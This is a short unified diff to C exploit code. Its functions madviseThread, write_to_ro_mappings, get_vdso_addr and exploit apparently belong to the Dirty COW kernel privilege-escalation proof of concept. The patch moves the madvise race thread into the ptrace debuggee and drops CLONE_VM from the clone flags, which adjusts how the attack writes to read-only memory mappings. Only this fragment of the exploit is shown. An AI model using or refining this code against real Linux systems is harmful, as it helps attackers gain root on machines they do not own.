@@ -246,7 +246,10 @@ static void *madviseThread(void *arg_)
 
 static int debuggee(void *arg_)
 {
+	pthread_t pth;
 	pid_t pid;
+
+	pthread_create(&pth, NULL, madviseThread, arg_);
 
 	if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1)
 		err(1, "ptrace(PTRACE_TRACEME)");
@@ -267,7 +270,7 @@ static int write_to_ro_mappings(struct mem_arg *arg)
 	int flags, i, ret, status;
 	pid_t pid;
 
-	flags = CLONE_VM|CLONE_PTRACE;
+	flags = CLONE_PTRACE;
 	pid = clone(debuggee, child_stack + sizeof(child_stack) - 8, flags, arg);
 	if (pid == -1) {
 		warn("clone");
@@ -355,16 +358,12 @@ static void *get_vdso_addr(void)
 
 static int exploit(struct mem_arg *arg, bool do_patch)
 {
-	pthread_t pth;
 	int ret;
 
 	arg->patched = false;
 	arg->do_patch = do_patch;
 
-	pthread_create(&pth, NULL, madviseThread, arg);
 	ret = write_to_ro_mappings(arg);
-
-	pthread_join(pth, NULL);
 
 	return ret;
 }
